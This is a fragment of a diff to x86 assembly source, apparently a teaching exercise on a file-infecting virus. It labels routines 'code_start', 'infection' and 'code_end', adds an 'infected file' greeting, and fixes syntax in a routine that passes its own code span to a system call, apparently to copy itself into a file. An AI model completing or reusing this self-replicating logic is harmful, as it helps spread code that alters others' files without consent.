@@ -1,3 +1,5 @@
+section .rodata
+    greet: db "Hello, infected file", 10, 0
 section .text
 global code_start
 global infection
@@ -37,15 +39,15 @@ code_start:
         add esp, 12
         push dword 4
         push dword code_start
-        mov ebx code_end
+        mov ebx, code_end
         sub ebx, code_start
         push dword ebx
         call system_call
         add esp, 12
         mov eax, [ebp-4]
-        push dword, eax
+        push dword eax
         popad
         add esp, 4
         pop ebp
         ret
-code_end
+code_end:
